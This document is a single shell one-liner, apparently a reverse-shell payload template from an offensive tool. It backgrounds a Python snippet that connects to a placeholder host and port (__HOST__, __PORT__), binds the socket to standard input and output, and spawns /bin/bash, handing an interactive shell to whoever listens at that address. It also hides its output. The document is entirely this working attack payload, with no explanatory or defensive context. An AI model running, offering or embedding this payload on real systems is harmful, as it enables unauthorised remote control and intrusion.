/usr/bin/nohup /bin/bash -c 'python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null